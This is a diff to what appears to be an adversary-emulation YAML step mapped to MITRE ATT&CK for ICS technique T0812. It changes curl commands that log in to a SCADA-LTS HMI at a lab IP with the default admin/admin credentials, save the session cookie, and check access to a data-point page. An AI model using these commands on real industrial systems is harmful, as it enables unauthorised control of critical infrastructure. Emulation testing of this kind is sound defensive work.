@@ -2,7 +2,7 @@
 
 - id: c3d4e5f6-3333-3333-3333-000000000001
   name: SCADA-LTS - Default Credential Login
-  description: Login to SCADA-LTS HMI with default admin credentials
+  description: Login to SCADA-LTS HMI at root context path
   tactic: credential-access
   technique_id: T0812
   technique_name: Default Credentials
@@ -11,8 +11,13 @@
     name: sh
     command: >
       curl -s -c /tmp/hmi_cookies.txt
-      -X POST "http://192.168.90.107:8080/ScadaBR/login.htm"
       -d "username=admin&password=admin"
-      -L -o /tmp/hmi_login.html -w "%{http_code}" &&
-      grep -qi "scada\|dashboard\|logged" /tmp/hmi_login.html &&
+      "http://192.168.90.107:8080/login.htm"
+      -o /tmp/hmi_login.html -w "%{http_code}" &&
+      echo "HTTP_STATUS:" &&
+      curl -s -b /tmp/hmi_cookies.txt
+      "http://192.168.90.107:8080/data_point_details.shtm"
+      -o /tmp/hmi_check.html &&
+      grep -qi "data\|point\|scada\|watch" /tmp/hmi_check.html &&
       echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"
+    timeout: 60
